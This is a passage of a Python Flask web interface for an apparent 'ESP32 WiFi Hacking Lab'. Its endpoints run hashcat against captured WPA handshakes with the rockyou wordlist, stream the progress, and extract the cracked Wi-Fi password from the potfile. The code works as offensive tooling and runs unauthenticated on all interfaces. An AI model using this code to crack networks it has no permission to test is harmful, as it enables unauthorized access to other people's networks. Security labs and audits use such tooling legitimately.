def api_hashcat_stop():
    global _hashcat_proc
    if _hashcat_proc and _hashcat_proc.poll() is None:
        _kill_proc(_hashcat_proc)
        _hashcat_proc = None
        _led_set("idle")
        return jsonify({"ok": True, "msg": "hashcat arrêté"})
    return jsonify({"ok": False, "msg": "Aucun crack en cours"})


@app.route("/api/hashcat/stream")
def api_hashcat_stream():
    """SSE : lance hashcat et streame la progression en temps réel."""
    global _hashcat_proc
    hash_line   = request.args.get("hash", "").strip()
    wordlist    = request.args.get("wordlist", "/usr/share/wordlists/rockyou.txt")
    device_id   = request.args.get("device_id", "")
    device_type = request.args.get("device_type", "")

    def generate():
        global _hashcat_proc
        if not hash_line:
            yield f"data: {json.dumps({'type':'error','msg':'hash manquant'})}\n\n"; return
        if not Path(wordlist).exists():
            yield f"data: {json.dumps({'type':'error','msg':f'Wordlist introuvable : {wordlist}'})}\n\n"; return

        # Garder uniquement les lignes WPA* valides — toutes, pas juste la première
        valid_lines = [l for l in hash_line.splitlines() if l.strip().startswith("WPA*")]
        if not valid_lines:
            yield f"data: {json.dumps({'type':'error','msg':'Aucune ligne WPA* valide'})}\n\n"; return

        cap_dir   = BASE_DIR / "captures"
        cap_dir.mkdir(exist_ok=True)
        hash_file = cap_dir / "crack_target.hc22000"
        pot_file  = cap_dir / "cracked.pot"
        pot_file.unlink(missing_ok=True)
        hash_file.write_text("\n".join(valid_lines) + "\n")
        yield f"data: {json.dumps({'type':'log','msg':f'[*] {len(valid_lines)} hash(es) chargé(s) dans le fichier cible'})}\n\n"
        _led_set("cracking")

        # --status-timer=5 : affiche vitesse/progression toutes les 5 sec
        cmd = ["hashcat", "-m", "22000", str(hash_file), wordlist,
               "--force", "--status", "--status-timer=5",
               "--potfile-path", str(pot_file)]
        if device_id:
            cmd += ["-d", str(device_id)]
        if device_type.upper() == "CPU":
            cmd += ["-D", "1"]
        elif device_type.upper() == "GPU":
            cmd += ["-D", "2"]

        yield f"data: {json.dumps({'type':'log','msg':'$ ' + ' '.join(cmd)})}\n\n"
        _hashcat_proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1,
            preexec_fn=os.setsid   # nouveau groupe de processus → killpg fonctionne
        )

        # Lecture non-bloquante via thread pour détecter l'arrêt immédiatement
        out_q = queue.Queue()
        def _reader(proc, q):
            for line in proc.stdout:
                q.put(line)
            q.put(None)   # sentinelle fin
        threading.Thread(target=_reader, args=(_hashcat_proc, out_q), daemon=True).start()

        while True:
            try:
                line = out_q.get(timeout=1)
            except queue.Empty:
                if _hashcat_proc is None or _hashcat_proc.poll() is not None:
                    break
                yield ": ping\n\n"   # keepalive SSE
                continue
            if line is None:
                break
            line = line.rstrip()
            if not line:
                continue
            # Hashcat affiche "hash:password" quand il trouve — on le détecte
            # en vérifiant si le potfile vient d'être écrit
            yield f"data: {json.dumps({'type':'log','msg':line})}\n\n"
            if pot_file.exists() and pot_file.stat().st_size > 0:
                cracked  = pot_file.read_text().strip().splitlines()[-1]
                password = cracked.split(":")[-1] if ":" in cracked else cracked
                _led_set("found")
                yield f"data: {json.dumps({'type':'found','password':password})}\n\n"

        if _hashcat_proc is not None:
            _hashcat_proc.wait()
            _hashcat_proc = None

        # Vérifier le potfile même si la ligne n'a pas été détectée
        if pot_file.exists() and pot_file.stat().st_size > 0:
            cracked  = pot_file.read_text().strip().splitlines()[-1]
            password = cracked.split(":")[-1] if ":" in cracked else cracked
            _led_set("found")
            yield f"data: {json.dumps({'type':'found','password':password})}\n\n"
        else:
            _led_set("idle")
            yield f"data: {json.dumps({'type':'done','found':False})}\n\n"

    return Response(stream_with_context(generate()), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/api/hashcat", methods=["POST"])
def api_hashcat():
    """Endpoint de compatibilité — redirige vers le stream SSE."""
    return jsonify({"ok": False, "error": "Utilisez /api/hashcat/stream (SSE)"}), 400


# ── Lancement ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════╗
║   ESP32 WiFi Hacking Lab — Interface Web     ║
║   http://localhost:{WEB_PORT}                      ║
║   Port ESP32 : {PORT_SERIAL}                  ║
║   Ctrl+C pour arrêter                        ║
╚══════════════════════════════════════════════╝
""")
    app.run(host="0.0.0.0", port=WEB_PORT, debug=False, threaded=True)
